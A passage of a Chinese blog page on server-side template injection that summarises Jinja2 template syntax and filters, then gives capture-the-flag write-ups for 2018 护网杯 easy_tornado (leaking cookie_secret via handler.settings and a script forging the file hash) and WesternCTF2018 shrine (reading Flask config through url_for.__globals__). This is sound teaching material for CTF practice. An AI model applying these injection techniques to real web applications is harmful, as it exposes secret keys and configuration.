+<pre><code class="hljs routeros">&#123; % <span class="hljs-builtin-name">set</span> <span class="hljs-attribute">name</span>=<span class="hljs-string">&#x27;xx&#x27;</span> % &#125;</code></pre>
+<p>with语句来创建一个内部的作用域，将set语句放在其中，这样创建的变量只在with代码块中才有效</p>
+<pre><code class="hljs clojure">&#123; % with gg = <span class="hljs-number">42</span> % &#125;
+&#123; &#123; gg &#125; &#125;
+&#123; % endwith % &#125;</code></pre>
+<p><strong>if语句</strong></p>
+<pre><code class="hljs erlang-repl">&#123; <span class="hljs-comment">% if ken.sick % &#125;</span>
+Ken is sick.
+&#123; <span class="hljs-comment">% elif ken.dead % &#125;</span>
+You killed Ken! You bastard!!!
+&#123; <span class="hljs-comment">% else % &#125;</span>
+Kenny looks okay --- so far
+&#123; <span class="hljs-comment">% endif % &#125;</span></code></pre>
+<p><strong>for语句</strong></p>
+<pre><code class="hljs routeros">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> user </span><span class="hljs-keyword">in</span><span class="hljs-built_in"> users </span>% &#125;
+&#123; &#123; user.username|e &#125; &#125;
+&#123; % endfor % &#125;</code></pre>
+<p>遍历</p>
+<pre><code class="hljs xquery">&#123; % <span class="hljs-keyword">for</span><span class="hljs-built_in"> key</span>, <span class="hljs-keyword">value</span> <span class="hljs-keyword">in</span> <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">strong</span>&gt;</span>my_dict.iteritems()<span class="hljs-tag">&lt;/<span class="hljs-name">strong</span>&gt;</span></span> % &#125;
+&amp;<span class="hljs-literal">lt</span>;dt&amp;<span class="hljs-literal">gt</span>;&#123; &#123;<span class="hljs-built_in"> key</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dt&amp;<span class="hljs-literal">gt</span>;
+&amp;<span class="hljs-literal">lt</span>;dd&amp;<span class="hljs-literal">gt</span>;&#123; &#123; <span class="hljs-keyword">value</span>|e &#125; &#125;&amp;<span class="hljs-literal">lt</span>;/dd&amp;<span class="hljs-literal">gt</span>;
+&#123; % endfor % &#125;</code></pre>
+<p>Jinja2中for循环内置常量</p>
+<ul>
+<li>
+<p>loop.index 当前迭代的索引（从1开始）</p>
+</li>
+<li>
+<p>loop.index0 当前迭代的索引（从0开始）</p>
+</li>
+<li>
+<p>loop.first 是否是第一次迭代，返回True/False</p>
+</li>
+<li>
+<p>loop.last 是否是最后一次迭代，返回True/False</p>
+</li>
+<li>
+<p>loop.length 序列的长度</p>
+</li>
+</ul>
+<p>注意：不可以使用continue和break表达式来控制循环的执行。</p>
+<p><strong>过滤器</strong></p>
+<p>过滤器是通过（|）符号进行使用的，例如：{ { name|length } }：将返回name的长度</p>
+<p>类似于我们平常的的函数，他他这种应该就是内置函数，因为它本身就含有很多过滤器</p>
+<pre><code class="hljs pgsql">abs(<span class="hljs-keyword">value</span>)：返回一个数值的绝对值。示例：<span class="hljs-number">-1</span>|abs
+last(<span class="hljs-keyword">value</span>)：返回一个序列的最后一个元素。示例：names|last。
+length(<span class="hljs-keyword">value</span>)：返回一个序列或者字典的长度。示例：names|length。
+<span class="hljs-keyword">join</span>(<span class="hljs-keyword">value</span>,d=u<span class="hljs-string">&#x27;&#x27;</span>)：将一个序列用d这个参数的值拼接成字符串。
+<span class="hljs-type">int</span>(<span class="hljs-keyword">value</span>)：将值转换为<span class="hljs-type">int</span>类型。
+<span class="hljs-type">float</span>(<span class="hljs-keyword">value</span>)：将值转换为<span class="hljs-type">float</span>类型。
+lower(<span class="hljs-keyword">value</span>)：将字符串转换为小写。
+upper(<span class="hljs-keyword">value</span>)：将字符串转换为小写</code></pre>
+<h6 id="2018护网杯easy-tornado"><a class="header-anchor" href="#2018护网杯easy-tornado">🍭</a>2018护网杯easy_tornado</h6>
+<p>tornado是python中的一个web应用框架。题目有三个文件：</p>
+<blockquote>
+<p>flag.txt</p>
+<blockquote>
+<p><code>flag in /fllllllllllllag</code></p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>welcome.txt</p>
+<blockquote>
+<p><code>render</code></p>
+<p>render是python中的一个渲染函数，渲染变量到模板中，即可以通过传递不同的参数形成不同的页面。<br>
+render函数介绍</p>
+</blockquote>
+</blockquote>
+<blockquote>
+<p>hints.txt</p>
+<p><code>md5(cookie_secret+md5(filename))</code></p>
+<p>分析url：<code>http://2ee77311-baf5-428b-9c3a-d86c6be03d0e.node3.buuoj.cn/file?filename=/flag.txt&amp;filehash=319862cec4f48911760eba1295bf83f5</code></p>
+<p>filehash=md5(cookie_secret+md5(filename))<br>
+现在filename=/fllllllllllllag，只需要知道cookie_secret的既能访问flag。</p>
+</blockquote>
+<p>在读取文件失败链接中发现ssti漏洞：</p>
+<p><img src="/2021/04/05/wei/7.jpg" srcset="/img/loading.gif" alt="7"></p>
+<p>测试发现一些字符被过滤</p>
+<pre><code class="hljs 1c"><span class="hljs-string">&quot; % &#x27; () * - /=[\]_|</span></code></pre>
+<p>在Tornado的前端页面模板中，Tornado提供了一些对象别名来快速访问对象，可以参考<a target="_blank" rel="noopener" href="https://tornado.readthedocs.io/en/latest/guide/templates.html#template-syntax">Tornado官方文档</a></p>
+<p>通过查阅文档发现cookie_secret在Application对象settings属性中，还发现<code>self.application.settings</code>有一个别名<a target="_blank" rel="noopener" href="https://tornado.readthedocs.io/en/latest/web.html#tornado.web.RequestHandler.settings">requesthandler.settings</a></p>
+<p><img src="/2021/04/05/wei/13.png" srcset="/img/loading.gif" alt="13"></p>
+<p><em>handler指向的处理当前这个页面的RequestHandler对象，RequestHandler.settings指向self.application.settings，因此handler.settings指向RequestHandler.application.settings。</em></p>
+<p>构造payload:</p>
+<p><img src="/2021/04/05/wei/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<p>计算<code>filehash</code>:</p>
+<pre><code class="hljs isbl"><span class="hljs-variable">import</span> <span class="hljs-variable">hashlib</span>
+
+<span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">md5</span>(<span class="hljs-variable">s</span>):</span>
+<span class="hljs-function"> <span class="hljs-variable">md5</span> = <span class="hljs-variable">hashlib.md5</span>() </span>
+<span class="hljs-function"> <span class="hljs-variable">md5.update</span>(<span class="hljs-variable">s.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>)) </span>
+<span class="hljs-function"> <span class="hljs-variable">return</span> <span class="hljs-variable">md5.hexdigest</span>()</span>
+ 
+<span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">filehash</span>():</span>
+<span class="hljs-function"> <span class="hljs-variable">filename</span> = <span class="hljs-string">&#x27;/fllllllllllllag&#x27;</span></span>
+<span class="hljs-function"> <span class="hljs-variable">cookie_secret</span> = <span class="hljs-string">&#x27;M)Z.&gt;&#125;&#123;O]lYIp(oW7$dc132uDaK&lt;C%wqj@PA![VtR#geh9UHsbnL_+mT5N~J84*r&#x27;</span></span>
+<span class="hljs-function"> <span class="hljs-title">print</span>(<span class="hljs-title">md5</span>(<span class="hljs-variable">cookie_secret</span>+<span class="hljs-title">md5</span>(<span class="hljs-variable">filename</span>)))</span>
+ 
+<span class="hljs-variable"><span class="hljs-keyword">if</span></span> <span class="hljs-variable">__name__</span> == <span class="hljs-string">&#x27;__main__&#x27;</span>:
+ <span class="hljs-function"><span class="hljs-title">filehash</span>()</span></code></pre>
+<p>成功，这个题目发现模板注入后的一个关键考点在于<code>handler.settings</code>。这个是Tornado框架本身提供给程序员可快速访问的配置文件对象之一。</p>
+<h6 id="WesternCTF2018-shrine"><a class="header-anchor" href="#WesternCTF2018-shrine">🍭</a>[WesternCTF2018]shrine</h6>
+<p>分析代码：</p>
+<p><img src="/2021/04/05/wei/10.png" srcset="/img/loading.gif" alt="10"></p>
+<p>在没有黑名单的时候，可以传入 config，或<code>&#123; &#123;self._*dict_*&#125; &#125;</code>获取，但当这些被过滤的时候，我们需要借助一些全局变量利用沙盒逃逸的方法，来调用被禁用的函数对象。在shrine路径下使用<code>&#123; &#123;url_for.__globlas__&#125; &#125;</code>查看</p>
+<p><img src="/2021/04/05/wei/11.jpg" srcset="/img/loading.gif" alt="11"></p>
+<p><code>current_app</code>是全局变量代理，查看他的<code>config</code>即可</p>
+<p><img src="/2021/04/05/wei/12.jpg" srcset="/img/loading.gif" alt="12"></p>
+<p>也可用<strong>get_flashed_messages</strong>：</p>
+<pre><code class="hljs isbl">返回之前在<span class="hljs-variable">Flask</span>中通过 <span class="hljs-function"><span class="hljs-title">flash</span>() 传入的闪现信息列表。把字符串对象表示的消息加入到一个消息队列中，然后通过调用 <span class="hljs-title">get_flashed_messages</span>(</span></code></pre>
+<p>此类题目思路:</p>
+<blockquote>
+<p>查阅相关框架的文档</p>
+<p>使用<code>dir</code>内省<code>locals</code>对象来查看所有能够使用的模板上下文</p>
+<p>使用dir深入内省所有对象</p>
+<p>直接分析框架源码</p>
+</blockquote>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                
+              </div>
+              
+                <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p>
+              
+              
+                <div class="post-prevnext row">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2021/04/06/wei4/">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">SSTI(二)</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2021/03/05/wei2/">
+                        <span class="hidden-mobile">metasploit（二）——后渗透测试</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+
+  
+</footer>
+
+<!-- SCRIPTS -->
+
+  <script  src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":200})
+    NProgress.start()
+    document.addEventListener('DOMContentLoaded', function() {
+      window.NProgress && window.NProgress.inc();
+    })
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js" ></script>
+<script  src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js" ></script>
+<script  src="/js/debouncer.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js" ></script>
+
+
+
+
+
+  <script  src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+  <script>
+    (function () {
+      var path = "/local-search.xml";
+      var inputArea = document.querySelector("#local-search-input");
+      inputArea.onclick = function () {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+        this.onclick = null
+      }
+    })()
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+
+</body>
+</html>
